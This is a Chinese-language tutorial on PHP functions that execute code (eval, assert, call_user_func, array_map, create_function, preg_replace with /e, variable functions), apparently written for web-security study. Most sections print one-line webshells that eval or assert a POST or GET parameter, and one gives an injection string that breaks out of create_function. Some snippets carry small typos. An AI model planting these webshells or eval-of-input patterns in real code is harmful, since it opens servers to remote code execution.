#  常见PHP代码执行函数
## eval 函数
把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false

``eval (string @code)``

``<?php @eval($_POST['cmd']);?>``

## assert 函数
如果 `assertion` 是字符串，它将会被 assert() 当做 PHP 代码来执行

``bool assert ( mixed $assertion [Throwable $exception] )``

``<?php @assert($_POST['cmd']);?>``

## call_user_func() 函数
call_user_func() 函数会把第一个参数作为回调函数调用

``mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )``

把第一个参数作为回调函数 callback 调用，其余参数作为回调函数的的参数传入

```
<?php
function callback(){
	$shell=$_GET['shell'];
	eval($shell);
}
@call_user_func('callback',$shell);
?>
```

## call_user_func_array() 函数

call_user_func_array() 函数把第一个参数作为回调函数 callback 调用，把参数数组作 param_arr 为回调函数的的参数传入

``mixed call_user_func_array ( callable $callback , array $param_arr )``

```
<?php
function callback(){
	$shell=$_GET['shell'];
	eval($shell);
}
@call_user_func_array('callback',array($shell));
?>
```

## array_map 函数
array_map 函数为数组的每个元素应用回调函数。array_map为 每个数组元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样

``array array_map ( callable $callback , array $array1 [, array $... ] )``

```
<?php
function callback(){
	$shell=$_GET['shell'];
	eval($shell);
}
@array_map('callback',array($shell));
?>
```

## create_function 函数
create_function 函数根据传递的参数创建匿名函数，并为该匿名函数返回唯一名称。

``steing create_function(string $args,string $code)

```
<?php
$id=$_GET['id'];
$code='echo'.$func.'test'.$id.';'
create_function('$func',$code);
?>
```

create_function函数会创建虚拟函数，转变为如下代码：

```
<?php
$id=$_GET['id'];
function func (func){
	echo "test".$id;
}
?>
```
当id传入的值为 ``1;}phpinfo();/*`` 是就可以造成代码执行

## preg_replace 函数
preg_replace 函数执行一个正则表达式的搜索和替换

``mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )``

搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换

参数说明：

-   $pattern: 要搜索的模式，可以是字符串或一个字符串数组。
    
-   $replacement: 用于替换的字符串或字符串数组。
    
-   $subject: 要搜索替换的目标字符串或字符串数组。
    
-   $limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。
    
-   $count: 可选，为替换执行的次数。

/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。

## 可变函数

PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。这意味着在PHP中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态地调用函数。可变函数可以用来实现包括回调函数，函数表在内的一些用途。